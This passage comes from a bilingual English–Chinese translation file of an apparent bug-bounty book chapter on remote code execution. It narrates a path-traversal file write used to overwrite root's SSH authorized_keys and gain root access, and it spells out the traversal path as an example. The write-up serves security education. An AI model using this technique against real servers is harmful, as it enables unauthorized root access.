    root 用户身份运行在服务器上。这是一个不好的做法：root 用户可以在网站上执行任何操作，如果应用被攻破，攻击者将获得服务器的完全权限。这也是 Landry
    继续挖掘的另一个原因。
- en: Next, Landry looked for *disclosed security issues*, or *CVEs*. The site had
    none, which was unusual for old, open source software. Landry identified a number
    of less severe issues including XSS, CSRF, XXEs, and a *local file disclosure*
    (the ability to read arbitrary files on a server). All of these bugs meant it
    was likely that an RCE could exist somewhere.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，Landry 查找了*已公开的安全问题*或 *CVE*（常见漏洞和暴露）。该站点没有发现任何问题，这对于旧的开源软件来说是不寻常的。Landry
    识别出一些不太严重的问题，包括 XSS、CSRF、XXE 和 *本地文件泄露*（能够读取服务器上的任意文件）。所有这些漏洞意味着可能在某个地方存在远程代码执行（RCE）漏洞。
- en: Continuing his work, Landry noticed an API endpoint that allowed users to update
    template files. The path was */api/i/services/site/write-configuration.json?path=/config/sites/test/page/test/config.xml*,
    and it accepted XML via a `POST` body. The ability to write files and the ability
    to define their path are two significant red flags. If Landry could write files
    anywhere and have the server interpret them as application files, he could execute
    whatever code he wanted on the server and possibly invoke system calls. To test
    this, he changed the path to *../../../../../../../../../../../../tmp/test.txt*.
    The symbols *../* are references to the previous directory in the current path.
    So if the path was */api/i/services*, *../* would be */api/i*. This allowed Landry
    to write in any folder he wanted.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 在继续工作时，Landry 注意到一个 API 接口，允许用户更新模板文件。路径是 */api/i/services/site/write-configuration.json?path=/config/sites/test/page/test/config.xml*，并且它通过
    `POST` 请求体接受 XML 格式。能够写入文件和定义文件路径是两个重大的红旗。如果 Landry 能在任何文件夹中写入文件，并让服务器将其解释为应用文件，他就能在服务器上执行任意代码，并可能调用系统命令。为了测试这一点，他将路径改为
    *../../../../../../../../../../../../tmp/test.txt*。符号 *../* 代表当前路径的上一级目录。所以，如果路径是
    */api/i/services*，则 *../* 就是 */api/i*。这让 Landry 可以在任何他想要的文件夹中写入文件。
- en: 'Uploading his own file worked, but the application configuration didn’t allow
    him to execute code, so he needed to find an alternative route to an RCE. It occurred
    to him that a *Secure Socket Shell (SSH)* can use public SSH keys to authenticate
    users. SSH access is the typical way to administer a remote server: it logs into
    the command line via the secure connection established by validating public keys
    on the remote host in the *.ssh/authorized_keys* directory. If he was able to
    write to the directory and upload his own SSH public key, the site would authenticate
    him as the root user with direct SSH access and full permissions on the server.'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 上传自己的文件成功了，但应用配置不允许他执行代码，因此他需要找到一种替代方式进行远程代码执行（RCE）。他突然想到，*安全套接字协议（SSH）*可以使用公钥认证用户。SSH
    访问是管理远程服务器的典型方式：它通过验证远程主机上的公钥，建立安全连接并登录到命令行，公钥存储在 *.ssh/authorized_keys* 目录中。如果他能写入该目录并上传自己的
    SSH 公钥，网站将认证他为 root 用户，直接通过 SSH 访问，并拥有服务器的完全权限。
- en: He tested this and was able to write to *../../../../../../../../../../../../root/.ssh/authorized_keys*.
    Attempting to use SSH to get into the server worked and running the `id` command
    confirmed he was root `uid=0(root) gid=0(root) groups=0(root)`.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 他进行了测试，并成功写入了 *../../../../../../../../../../../../root/.ssh/authorized_keys*。尝试使用
    SSH 访问服务器成功，执行 `id` 命令确认他是 root 用户 `uid=0(root) gid=0(root) groups=0(root)`。
- en: '***Takeaways***'
  id: totrans-85
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: '***总结***'
- en: Enumerating subdomains when you’re searching for bugs in a large scope is important
    because it gives you more surface area to test. Landry was able to use automated
    tools to discover a suspicious target, and confirming a few initial vulnerabilities
    indicated there could be more to find. Most notably, when his initial attempt
    at a file upload RCE failed, Landry reconsidered his approach. He recognized that
    he could exploit the SSH configuration rather than just report the arbitrary file
    writing vulnerability by itself. Submitting a comprehensive report that fully
    demonstrates impact usually increases the bounty amount you’re awarded. So don’t
    stop immediately once you’ve found something—keep digging.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 在大范围寻找漏洞时，枚举子域是非常重要的，因为这为你提供了更多的测试面。Landry能够使用自动化工具发现一个可疑的目标，并且确认了一些初步的漏洞，表明可能还有更多的漏洞待发现。最值得注意的是，当他最初的文件上传RCE尝试失败时，Landry重新考虑了他的做法。他意识到，他可以利用SSH配置漏洞，而不仅仅是报告单一的任意文件写入漏洞。提交一份全面的报告，充分展示其影响，通常会增加你获得的奖励金额。所以，一旦发现漏洞，不要立即停止——继续挖掘。
- en: '**Summary**'
  id: totrans-87
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: '**总结**'
- en: RCE, like a lot of other vulnerabilities discussed in this book, usually occurs
    when user input isn’t properly sanitized before use. In the first bug report,
    ImageMagick wasn’t properly escaping content before passing it to system commands.
    To find this bug, Sadeghipour first re-created the vulnerability on his own server
    and then went searching for unpatched servers. In contrast, Prins discovered a
    secret that allowed him to forge signed cookies. Lastly, Landry found a way to
    write arbitrary files on a server and used that to overwrite SSH keys so he could
    log in as root. All three used different methods to obtain RCE, but each took
    advantage of the site accepting unsanitized input.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: RCE（远程代码执行），和本书中讨论的许多其他漏洞一样，通常发生在用户输入未经过正确清理和处理的情况下。在第一个漏洞报告中，ImageMagick在将内容传递给系统命令之前没有正确转义。为了发现这个漏洞，Sadeghipour首先在自己的服务器上重新创建了这个漏洞，然后开始寻找未打补丁的服务器。与此相对，Prins发现了一个秘密，使他能够伪造签名的Cookie。最后，Landry找到了一个方法，可以在服务器上写入任意文件，并利用这个漏洞覆盖SSH密钥，从而以root身份登录。三个人使用了不同的方法来获取RCE，但每个人都利用了网站接受未经清理的输入这一点。
